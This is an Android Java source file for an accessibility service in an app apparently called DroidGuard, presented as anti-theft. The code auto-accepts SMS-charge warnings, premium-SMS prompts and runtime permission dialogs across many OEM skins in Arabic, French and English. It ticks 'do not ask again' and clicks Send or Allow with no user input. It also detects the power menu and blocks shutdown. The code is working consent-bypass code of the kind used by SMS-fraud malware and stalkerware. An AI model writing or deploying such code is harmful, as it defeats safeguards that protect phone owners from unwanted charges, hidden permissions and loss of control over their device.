package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import java.util.Locale;

/**
 * Universal DroidGuard Auto-Confirm & Anti-Shutdown Accessibility Service
 * 
 * Works across ALL Android OEM skins and manufacturers:
 *  - Condor Algeria (Plume, Allure, Griffe, Peak / MediaTek AOSP)
 *  - Samsung (One UI / Galaxy)
 *  - Xiaomi, Redmi, POCO (MIUI / HyperOS)
 *  - Realme & OPPO (Realme UI / ColorOS)
 *  - Transsion (Infinix, Tecno, Itel)
 *  - Stock Android / Google Pixel / Motorola / Huawei
 * 
 * Automatically detects SMS confirmation dialogs, carrier warning prompts, and permission requests
 * in Arabic, French, and English, checks "Remember choice", and clicks Send/Allow instantly without user touch.
 * Also intercepts unauthorized shutdown/power menu attempts and enforces PIN authentication.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";
    public static AutoConfirmService instance = null;

    // Power Menu & Shutdown Keywords (Arabic, French, English)
    private static final String[] POWER_MENU_KEYWORDS = new String[] {
        // Arabic
        "إيقاف التشغيل",
        "إيقاف تشغيل",
        "إعادة التشغيل",
        "إعادة تشغيل",
        "وضع الطوارئ",
        "إيقاف تشغيل الهاتف",
        
        // French
        "éteindre",
        "eteindre",
        "redémarrer",
        "redemarrer",
        "arrêter",
        "arreter",
        "mode urgence",
        
        // English
        "power off",
        "shut down",
        "shutdown",
        "restart",
        "reboot",
        "emergency mode"
    };

    private static final String[] POWER_MENU_PACKAGES = new String[] {
        "com.android.systemui",
        "android",
        "com.samsung.android.globalactions",
        "com.miui.power",
        "com.coloros.safecenter",
        "com.oplus.powermenu",
        "com.android.settings"
    };

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "AutoConfirmService connected and active.");
    }

    @Override
    public void onDestroy() {
        if (instance == this) instance = null;
        super.onDestroy();
    }

    public static boolean openNativePowerMenu() {
        if (instance != null) {
            return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
        }
        return false;
    }

    // Known OEM Packages that handle SMS dispatch confirmation & permissions
    private static final String[] OEM_TARGET_PACKAGES = new String[] {
        // Universal & AOSP (Condor, Pixel, Motorola, General Android)
        "android",
        "telephony",
        "phone",
        "mms",
        "messaging",
        "packageinstaller",
        "permissioncontroller",
        "mediatek",
        "condor",
        
        // Samsung (One UI)
        "samsung",
        "sec.android",
        
        // Xiaomi / Redmi / POCO (MIUI / HyperOS)
        "miui",
        "securitycenter",
        "securityadd",
        "lbe",
        
        // Realme / OPPO (Realme UI / ColorOS / Oplus)
        "coloros",
        "oplus",
        "nearme",
        
        // Transsion (Infinix, Tecno, Itel)
        "transsion",
        "phonemanager",
        
        // Huawei / Honor (EMUI / Magic UI)
        "huawei",
        "systemmanager"
    };

    // Multilingual Warning Keywords (Arabic, French, English)
    private static final String[] WARNING_KEYWORDS = new String[] {
        // Arabic
        "سيرسل رسالة sms",
        "سيرسل رسالة",
        "رسالة sms",
        "رسالة قصيرة",
        "رسائل قصيرة",
        "فرض رسوم",
        "رسوم إضافية",
        "قد يتسبب",
        "قد يؤدي هذا إلى فرض رسوم",
        "قد يؤدي",
        "رسوم مشغل شبكة الجوال",
        "هل تريد السماح",
        "محاولة إرسال رسالة",
        "استهلاك رصيد",
        "anti-theft",
        "droidguard",

        // French (Widely used in Algeria on Condor, Samsung, Realme)
        "souhaite envoyer un sms",
        "souhaite envoyer un message",
        "peut entraîner des frais",
        "des frais peuvent s'appliquer",
        "frais sur votre facture",
        "envoi de sms",
        "sms surtaxé",
        "cette application tente d'envoyer un sms",
        "autoriser l'envoi de sms",
        "service sms",
        "message texte",
        "enverra un sms",
        "envoyer un sms",
        "frais de l'opérateur",
        "autoriser à envoyer des sms",
        "autoriser cette application",

        // English
        "would like to send a message",
        "would like to send an sms",
        "send an sms",
        "sending an sms",
        "cause charges",
        "carrier charges",
        "charges may apply",
        "send premium sms",
        "is attempting to send an sms",
        "allow to send sms",
        "allow anti-theft"
    };

    // Multilingual Positive Buttons (Arabic, French, English)
    private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
        // Arabic
        "إرسال على أي حال",
        "ارسال على اي حال",
        "إرسال",
        "ارسال",
        "السماح دائماً",
        "السماح دائما",
        "سماح دائماً",
        "سماح دائما",
        "السماح",
        "سماح",
        "موافق",
        "قبول",
        "متابعة",
        "تأكيد",

        // French
        "envoyer quand même",
        "envoyer",
        "toujours autoriser",
        "autoriser l'envoi",
        "autoriser",
        "accepter",
        "continuer",
        "confirmer",
        "oui",
        "ok",

        // English
        "send anyway",
        "send",
        "always allow",
        "allow all the time",
        "allow",
        "accept",
        "continue",
        "confirm",
        "yes",
        "ok"
    };

    // OEM-specific View IDs for Positive Confirmation Buttons
    private static final String[] POSITIVE_VIEW_IDS = new String[] {
        // Universal Android & Condor / AOSP
        "android:id/button1",
        "android:id/ok",
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.google.android.apps.messaging:id/confirm_button",
        "com.google.android.apps.messaging:id/positive_button",
        "com.android.mms:id/button1",

        // Samsung (One UI)
        "com.samsung.android.messaging:id/button1",
        "com.samsung.android.messaging:id/positive_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
        "com.samsung.android.permissioncontroller:id/continue_button",

        // Xiaomi / Redmi / POCO (MIUI / HyperOS)
        "com.miui.securitycenter:id/accept",
        "com.miui.securitycenter:id/btn_allow",
        "com.miui.securitycenter:id/permission_allow_button",
        "com.miui.securitycenter:id/allow_button",
        "com.lbe.security.miui:id/accept",
        "com.lbe.security.miui:id/btn_allow",

        // Realme & OPPO (Realme UI / ColorOS)
        "com.oplus.safecenter:id/btn_confirm",
        "com.coloros.safecenter:id/btn_confirm",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.coloros.securitypermission:id/permission_allow_button",
        "com.nearme.safecenter:id/btn_confirm",

        // Transsion & Huawei
        "com.transsion.phonemanager:id/btn_allow",
        "com.huawei.systemmanager:id/btn_allow"
    };

    // OEM Checkbox IDs for "Remember my choice"
    private static final String[] CHECKBOX_VIEW_IDS = new String[] {
        "android:id/check",
        "android:id/checkbox",
        "com.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.google.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.messaging:id/remember_choice",
        "com.miui.securitycenter:id/remember",
        "com.miui.securitycenter:id/check",
        "com.oplus.safecenter:id/checkbox",
        "com.coloros.safecenter:id/checkbox"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null && event != null) {
            rootNode = event.getSource();
        }
        if (rootNode == null) return;

        try {
            CharSequence pkgName = event != null ? event.getPackageName() : null;
            String pkgStr = pkgName != null ? pkgName.toString().toLowerCase(Locale.ROOT) : "";

            // 0. Intercept Power Menu / Shutdown Attempt (Anti-Shutdown Guard)
            try {
                SharedPreferences prefs = getSharedPreferences("droidguard_security_prefs", Context.MODE_PRIVATE);
                boolean antiShutdownEnabled = prefs.getBoolean("anti_shutdown_enabled", true);
                long bypassUntil = prefs.getLong("anti_shutdown_bypass_until", 0L);

                if (antiShutdownEnabled && System.currentTimeMillis() > bypassUntil) {
                    boolean isPowerPkg = false;
                    for (String p : POWER_MENU_PACKAGES) {
                        if (pkgStr.contains(p)) {
                            isPowerPkg = true;
                            break;
                        }
                    }

                    if (isPowerPkg) {
                        boolean hasPowerKw = false;
                        for (String pkw : POWER_MENU_KEYWORDS) {
                            List<AccessibilityNodeInfo> pnodes = rootNode.findAccessibilityNodeInfosByText(pkw);
                            if (pnodes != null && !pnodes.isEmpty()) {
                                hasPowerKw = true;
                                break;
                            }
                        }

                        if (hasPowerKw) {
                            Log.i(TAG, "⚡ Intercepted Power Menu / Shutdown dialog. Dismissing dialog and triggering PIN Lock!");
                            performGlobalAction(GLOBAL_ACTION_BACK);
                            performGlobalAction(GLOBAL_ACTION_HOME);

                            Intent lockIntent = new Intent(this, MainActivity.class);
                            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            lockIntent.putExtra("TRIGGER_POWER_LOCK", true);
                            startActivity(lockIntent);

                            EmergencySmsPlugin.notifyPowerOffIntercepted();
                            return;
                        }
                    }
                }
            } catch (Exception ePower) {
                Log.w(TAG, "Error in anti-shutdown interception check: " + ePower.getMessage());
            }

            // Check if package matches any known OEM or system telecom package
            boolean isOemOrSystemPkg = false;
            for (String oemPkg : OEM_TARGET_PACKAGES) {
                if (pkgStr.contains(oemPkg)) {
                    isOemOrSystemPkg = true;
                    break;
                }
            }

            // Check if window content contains any SMS warning keyword
            boolean isSmsWarningDialog = false;
            for (String kw : WARNING_KEYWORDS) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    isSmsWarningDialog = true;
                    Log.i(TAG, "Detected SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
                    break;
                }
            }

            // Proceed if detected as SMS confirmation or if it's an OEM security/telecom dialog
            if (isSmsWarningDialog || isOemOrSystemPkg) {
                // Step 1: Auto-check "Remember my choice" / "Ne plus me demander" / "تذكر خياري"
                autoCheckRememberChoice(rootNode);

                // Step 2: Attempt clicking positive button by View IDs across all OEMs
                for (String viewId : POSITIVE_VIEW_IDS) {
                    try {
                        List<AccessibilityNodeInfo> positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
                        if (positiveButtons != null && !positiveButtons.isEmpty()) {
                            for (AccessibilityNodeInfo btn : positiveButtons) {
                                if (btn.isEnabled() && clickNodeOrParent(btn)) {
                                    Log.i(TAG, "Auto-clicked positive button via OEM View ID [" + viewId + "] successfully!");
                                    return;
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }

                // Step 3: Attempt clicking positive button by matching multilingual positive texts
                for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                    List<AccessibilityNodeInfo> matchingButtons = rootNode.findAccessibilityNodeInfosByText(positiveText);
                    if (matchingButtons != null && !matchingButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : matchingButtons) {
                            if (btn.isEnabled() && clickNodeOrParent(btn)) {
                                Log.i(TAG, "Auto-clicked positive button via text [" + positiveText + "] successfully!");
                                return;
                            }
                        }
                    }
                }

                // Step 4: Recursive deep search for any clickable button in the dialog
                if (isSmsWarningDialog) {
                    if (findAndClickAnyPositiveButton(rootNode)) {
                        Log.i(TAG, "Auto-clicked positive button via deep recursive search!");
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error in onAccessibilityEvent: " + e.getMessage());
        }
    }

    /**
     * Check any unchecked checkbox in the dialog (e.g. "Do not ask again" / "تذكر خياري" / "Ne plus me demander")
     */
    private void autoCheckRememberChoice(AccessibilityNodeInfo root) {
        if (root == null) return;

        // Try known View IDs first
        for (String cid : CHECKBOX_VIEW_IDS) {
            try {
                List<AccessibilityNodeInfo> checkboxes = root.findAccessibilityNodeInfosByViewId(cid);
                if (checkboxes != null) {
                    for (AccessibilityNodeInfo cb : checkboxes) {
                        if (cb.isCheckable() && !cb.isChecked()) {
                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via View ID: " + cid);
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        // Try matching common checkbox text in Arabic, French, English
        String[] rememberTexts = new String[] {
            "تذكر خياري",
            "عدم السؤال مرة أخرى",
            "تذكر اختياري",
            "لا تسأل مرة أخرى",
            "ne plus me demander",
            "se souvenir de mon choix",
            "mémoriser mon choix",
            "remember my choice",
            "don't ask again",
            "do not ask again"
        };
        for (String rText : rememberTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(rText);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isCheckable() && !node.isChecked()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "Checked 'Remember my choice' option via text: " + rText);
                    } else {
                        // Sometimes the checkbox is a sibling or parent
                        AccessibilityNodeInfo parent = node.getParent();
                        if (parent != null) {
                            for (int i = 0; i < parent.getChildCount(); i++) {
                                AccessibilityNodeInfo child = parent.getChild(i);
                                if (child != null && child.isCheckable() && !child.isChecked()) {
                                    child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    Log.i(TAG, "Checked 'Remember my choice' sibling checkbox for: " + rText);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * Deep recursive search to find and click any button containing positive keywords
     */
    private boolean findAndClickAnyPositiveButton(AccessibilityNodeInfo node) {
        if (node == null) return false;

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        String combined = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase(Locale.ROOT).trim();

        if (!combined.isEmpty()) {
            for (String posText : POSITIVE_BUTTON_TEXTS) {
                if (combined.equals(posText) || combined.startsWith(posText)) {
                    if (node.isEnabled() && clickNodeOrParent(node)) {
                        return true;
                    }
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickAnyPositiveButton(child)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            if (parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo grandParent = parent.getParent();
            if (grandParent != null && grandParent.isClickable()) {
                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
